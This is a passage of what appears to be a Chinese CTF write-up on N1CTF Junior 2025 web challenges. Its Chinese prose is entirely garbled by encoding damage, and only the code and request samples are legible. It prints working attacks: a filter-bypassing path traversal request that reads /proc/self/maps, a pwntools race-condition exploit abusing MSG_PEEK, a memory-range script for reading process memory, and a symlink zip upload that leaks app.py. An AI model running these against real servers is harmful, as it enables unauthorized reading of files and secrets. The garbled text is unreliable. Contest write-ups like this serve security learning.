class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åŒ¹é…ç›´æ¥æ›¿æ¢ä¸ºç©ºæ˜¯ä¸€ä¸ªå±é™©çš„è®¾è®¡ï¼Œç”¨è¿™ä¸ªæ’åœ¨ä¸¤ä¸ªå­—ç¬¦ä¹‹é—´å³å¯ç»•è¿‡ forbidden</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/.?offset=0&amp;length=100000.?offset=0&amp;length=10000/pr?offset=0&amp;length=100000oc/self/maps</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">60.205.163.215:17309</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å› ä¸º flag è¯»åˆ°å†…å­˜é‡Œäº†ï¼Œæˆ‘ä»¬éœ€è¦è¯» &#x2F;proc&#x2F;self&#x2F;memï¼Œå…ˆè·å– maps</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250914120217077.png"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">56395827e000-56395827f000 r--p 00000000 103:00 15523385                  /usr/local/bin/python3.1256395827f000-563958280000 r-xp 00001000 103:00 15523385                  /usr/local/bin/python3.12563958280000-563958281000 r--p 00002000 103:00 15523385                  /usr/local/bin/python3.12563958281000-563958282000 r--p 00002000 103:00 15523385                  /usr/local/bin/python3.12563958282000-563958283000 rw-p 00003000 103:00 15523385                  /usr/local/bin/python3.12563959f5f000-56395a3b0000 rw-p 00000000 00:00 0                          [heap]7fa2fe996000-7fa2fe998000 r--p 00000000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so7fa2fe998000-7fa2fe99b000 r-xp 00002000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so7fa2fe99b000-7fa2fe99d000 r--p 00005000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so7fa2fe99d000-7fa2fe99e000 r--p 00006000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so7fa2fe99e000-7fa2fe99f000 rw-p 00007000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so7fa2fe99f000-7fa2fe9a0000 r--p 00000000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so7fa2fe9a0000-7fa2fe9a2000 r-xp 00001000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so7fa2fe9a2000-7fa2fe9a4000 r--p 00003000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so7fa2fe9a4000-7fa2fe9a5000 r--p 00004000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so7fa2fe9a5000-7fa2fe9a6000 rw-p 00005000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so7fa2fe9a6000-7fa2fe9a8000 r--p 00000000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so7fa2fe9a8000-7fa2fe9af000 r-xp 00002000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so7fa2fe9af000-7fa2fe9b1000 r--p 00009000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so7fa2fe9b1000-7fa2fe9b2000 r--p 0000a000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so7fa2fe9b2000-7fa2fe9b3000 rw-p 0000b000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so7fa2fe9b3000-7fa2fe9b8000 r--p 00000000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.77fa2fe9b8000-7fa2fea67000 r-xp 00005000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.77fa2fea67000-7fa2fea7b000 r--p 000b4000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.77fa2fea7b000-7fa2fea7c000 r--p 000c8000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.77fa2fea7c000-7fa2fea7d000 rw-p 000c9000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.77fa2fea7d000-7fa2fea80000 r--p 00000000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.17fa2fea80000-7fa2fea94000 r-xp 00003000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.17fa2fea94000-7fa2fea9b000 r--p 00017000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.17fa2fea9b000-7fa2fea9c000 r--p 0001d000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.17fa2fea9c000-7fa2fea9d000 rw-p 0001e000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.17fa2fea9d000-7fa2feb94000 r--p 00000000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.37fa2feb94000-7fa2fef15000 r-xp 000f7000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.37fa2fef15000-7fa2ff04c000 r--p 00478000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.37fa2ff04c000-7fa2ff0cf000 r--p 005ae000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.37fa2ff0cf000-7fa2ff0d2000 rw-p 00631000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.37fa2ff0d2000-7fa2ff0d5000 rw-p 00000000 00:00 0 7fa2ff0d5000-7fa2ff0d9000 r--p 00000000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so7fa2ff0d9000-7fa2ff0df000 r-xp 00004000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so7fa2ff0df000-7fa2ff0e3000 r--p 0000a000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so7fa2ff0e3000-7fa2ff0e4000 r--p 0000d000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so7fa2ff0e4000-7fa2ff0e6000 rw-p 0000e000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so7fa2ff0e6000-7fa2ff0ea000 r--p 00000000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so7fa2ff0ea000-7fa2ff0f1000 r-xp 00004000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so7fa2ff0f1000-7fa2ff0f5000 r--p 0000b000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so7fa2ff0f5000-7fa2ff0f6000 r--p 0000f000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so7fa2ff0f6000-7fa2ff0f7000 rw-p 00010000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so7fa2ff0f7000-7fa2ff1f7000 rw-p 00000000 00:00 0 7fa2ff1f7000-7fa2ff1f9000 r--p 00000000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so7fa2ff1f9000-7fa2ff1fc000 r-xp 00002000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so7fa2ff1fc000-7fa2ff1fe000 r--p 00005000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so7fa2ff1fe000-7fa2ff1ff000 r--p 00006000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so7fa2ff1ff000-7fa2ff200000 rw-p 00007000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so7fa2ff200000-7fa2ff300000 rw-p 00000000 00:00 0 7fa2ff300000-7fa2ff304000 r--p 00000000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so7fa2ff304000-7fa2ff30f000 r-xp 00004000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so7fa2ff30f000-7fa2ff318000 r--p 0000f000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so7fa2ff318000-7fa2ff319000 r--p 00017000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so7fa2ff319000-7fa2ff31a000 rw-p 00018000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so7fa2ff31a000-7fa2ff51a000 rw-p 00000000 00:00 0 7fa2ff51a000-7fa2ff52b000 r--p 00000000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.67fa2ff52b000-7fa2ff5a8000 r-xp 00011000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.67fa2ff5a8000-7fa2ff608000 r--p 0008e000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.67fa2ff608000-7fa2ff609000 r--p 000ed000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.67fa2ff609000-7fa2ff60a000 rw-p 000ee000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.67fa2ff60a000-7fa2ff632000 r--p 00000000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.67fa2ff632000-7fa2ff797000 r-xp 00028000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.67fa2ff797000-7fa2ff7ed000 r--p 0018d000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.67fa2ff7ed000-7fa2ff7f1000 r--p 001e2000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.67fa2ff7f1000-7fa2ff7f3000 rw-p 001e6000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.67fa2ff7f3000-7fa2ff800000 rw-p 00000000 00:00 0 7fa2ff800000-7fa2ff900000 r--p 00000000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.07fa2ff900000-7fa2ffb1f000 r-xp 00100000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.07fa2ffb1f000-7fa2ffc6f000 r--p 0031f000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.07fa2ffc6f000-7fa2ffce6000 r--p 0046e000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.07fa2ffce6000-7fa2ffe55000 rw-p 004e5000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.07fa2ffe55000-7fa2ffe56000 rw-p 00000000 00:00 0 7fa2ffe5c000-7fa2ffe5f000 r--p 00000000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so7fa2ffe5f000-7fa2ffe67000 r-xp 00003000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so7fa2ffe67000-7fa2ffe6c000 r--p 0000b000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so7fa2ffe6c000-7fa2ffe6d000 r--p 0000f000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so7fa2ffe6d000-7fa2ffe6e000 rw-p 00010000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so7fa2ffe6e000-7fa2ffed4000 rw-p 00000000 00:00 0 7fa2ffed4000-7fa2ffedb000 r--s 00000000 103:00 15520059                  /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache7fa2ffedb000-7fa2fff35000 r--p 00000000 103:00 15519696                  /usr/lib/locale/C.utf8/LC_CTYPE7fa2fff35000-7fa2fff37000 rw-p 00000000 00:00 0 7fa2fff38000-7fa2fff39000 rw-s 00000000 00:01 6174                       /dev/zero (deleted)7fa2fff39000-7fa2fff3b000 rw-p 00000000 00:00 0 7fa2fff3b000-7fa2fff3c000 r--p 00000000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27fa2fff3c000-7fa2fff64000 r-xp 00001000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27fa2fff64000-7fa2fff6f000 r--p 00029000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27fa2fff6f000-7fa2fff71000 r--p 00034000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27fa2fff71000-7fa2fff72000 rw-p 00036000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27fa2fff72000-7fa2fff73000 rw-p 00000000 00:00 0 7ffe68e9d000-7ffe68ebe000 rw-p 00000000 00:00 0                          [stack]7ffe68ec9000-7ffe68ecd000 r--p 00000000 00:00 0                          [vvar]7ffe68ecd000-7ffe68ecf000 r-xp 00000000 00:00 0                          [vdso]ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæå‡ºç¥–ä¼ è„šæœ¬ç®—åç§»å’Œé•¿åº¦ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> remaps<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'maps'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> maps<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">list</span> <span class="token operator">=</span> b<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'rw'</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>        addr <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'([0-9a-f]+)-([0-9a-f]+)'</span><span class="token punctuation">,</span>line<span class="token punctuation">)</span>        <span class="token comment">#æ­£åˆ™åŒ¹é…åœ°å€,åœ°å€æ ¼å¼ä¸ºåå…­è¿›åˆ¶æ•°[0-9a-f],reserchä¼šè¿”å›ä¸€ä¸ªre.Matchå¯¹è±¡ï¼Œç”¨æ‹¬å·æ‹¬èµ·æ¥æ˜¯ä¸ºäº†ä½¿ç”¨group()å¤„ç†è¿”å›ç»“æœã€‚</span>        start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment">#å°†åå…­è¿›åˆ¶å­—ç¬¦è½¬åŒ–ä¸ºåè¿›åˆ¶æ•°ï¼Œä¸ºäº†ç¬¦åˆstartå‚æ•°æ ¼å¼å‚è€ƒé“¾æ¥</span>        end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token comment">#å°†åå…­è¿›åˆ¶å­—ç¬¦è½¬åŒ–ä¸ºåè¿›åˆ¶æ•°ï¼Œä¸ºäº†ç¬¦åˆendå‚æ•°æ ¼å¼</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºä¸æ¸…æ¥šåœ¨å“ªä¸€æ®µå†…å­˜é‡Œé¢äºæ˜¯æ¯ä¸ªéƒ½ç®—å‡ºæ¥æ‰‹åŠ¨ fuzz äº†ï¼ˆ</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250914115708081.png"></p><p>æœ€åä¹Ÿæ˜¯å¯ä»¥çœ‹åˆ°æ˜¯åœ¨ <code>/usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</code> è¿™ä¸€æ®µé‡Œé¢</p><h2 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h2><p>ç»™äº†é‚£ä¹ˆå¤§ä¸€ä¸ª log ä¸å¯èƒ½ä¸ç”¨</p><p>ä»£ç é‡Œè¿›è¡Œäº†ä¸¤æ¬¡ recvï¼Œä¸ waf ç›¸å…³çš„æ˜¯è¿™ä¸€æ®µ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">initial_data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span>MSG_PEEK<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>term <span class="token keyword">in</span> initial_data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> term <span class="token keyword">in</span> FORBIDDEN<span class="token punctuation">)</span><span class="token punctuation">:</span>    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b"HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected."</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>é€šå¸¸ recv() å‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°ä¸º0ï¼Œä»£è¡¨ä»ç¼“å†²åŒºå–èµ°æ•°æ®ï¼Œè€Œå½“ä¸º MSG_PEEK æ—¶ä»£è¡¨åªæ˜¯æŸ¥çœ‹æ•°æ®ï¼Œè€Œä¸å–èµ°æ•°æ®ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æ•°æ®ä¼šç•™åœ¨ç¼“å†²åŒºï¼Œè€Œæ­£å¼è¯»å…¥æ˜¯åœ¨ handle_connectionï¼Œä¸€æ—¦è¯»å–åˆ™ä¼šæŠŠæ•°æ®ç§»é™¤ç¼“å†²åŒº</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">handle_connection</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> log<span class="token punctuation">,</span> factor<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        conn<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">10.0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> log<span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'log.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                fcntl<span class="token punctuation">.</span>flock<span class="token punctuation">(</span>f<span class="token punctuation">,</span> fcntl<span class="token punctuation">.</span>LOCK_EX<span class="token punctuation">)</span>                log_bytes <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span><span class="token punctuation">:</span>                    log_bytes <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha3_256<span class="token punctuation">(</span>log_bytes<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>                log_entry <span class="token operator">=</span> log_bytes<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>log_entry<span class="token punctuation">)</span>                        request_data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¯»å…¥å‰ï¼Œå¦‚æœå¼€äº† log æ¨¡å¼ï¼Œä¼šä¼˜å…ˆè¿›è¡Œ log å†è¯»å…¥ï¼Œè€Œå¦‚æœè¿™é‡Œ factor çš„å€¼ç»™é«˜äº†åˆ™ä¼šå¡åœ¨ log è¿™é‡Œä¸€æ®µæ—¶é—´ï¼Œé‚£ä¹ˆç¼“å†²åŒºä¸­å°±ä¼šæŒç»­å­˜åœ¨ <code>GET /?log=1&amp;factor=100000</code>ï¼Œæ­¤æ—¶å¦‚æœåœ¨é€šè¿‡ MSG_PEEK åç¼“å†²åŒºè¿˜æœªæ¸…é™¤ä¹‹å‰ç«‹åˆ»æ’å…¥ <code>/../../../proc/self/maps</code> ï¼Œé‚£ä¹ˆå®é™…è¿›å…¥ <code>request_data = conn.recv(256)</code> çš„ç¼“å†²åŒºå†…ä¸º <code>GET /?log=1&amp;factor=100000/../../../proc/self/maps </code></p><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>host <span class="token operator">=</span> <span class="token string">'localhost'</span>port <span class="token operator">=</span> <span class="token number">1337</span>remote1 <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>remote1<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'GET /?log=1&amp;factor=100000'</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>remote1<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/../../../../proc/self/maps'</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>resp <span class="token operator">=</span> remote1<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å°±èƒ½è¯»åˆ° mapsï¼Œç„¶åå°±æ˜¯ç¿» mem äº†</p><hr><h1 id="online-unzipper"><a href="#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h1><p>ç»™äº†ä¸ªæ³¨å†Œï¼Œæœ‰ sessionï¼Œè§£å‡ºæ¥æ˜¯ <code>&#123;&quot;role&quot;:&quot;user&quot;,&quot;username&quot;:&quot;admin&quot;&#125;</code></p><p>æœ‰å‹ç¼©åŒ…ä¸Šä¼ å¹¶è§£å‹ï¼Œæ˜æ˜¾æ˜¯æ‰“è½¯é“¾æ¥ï¼Œè¯» app.py</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /app/app.py toapppy<span class="token function">zip</span> <span class="token parameter variable">-y</span> ln.zip toapppy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸Šä¼ è§£å‹ï¼Œç„¶åè®¿é—® toapppy å¾—åˆ°æºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> uuid<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>send_file<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span> session<span class="token punctuation">,</span> send_from_directory<span class="token punctuation">,</span> abort<span class="token punctuation">,</span> Responseapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"FLASK_SECRET_KEY"</span><span class="token punctuation">,</span> <span class="token string">"test_key"</span><span class="token punctuation">)</span>UPLOAD_FOLDER <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"uploads"</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"upload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"ç”¨æˆ·åå·²å­˜åœ¨"</span>        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span 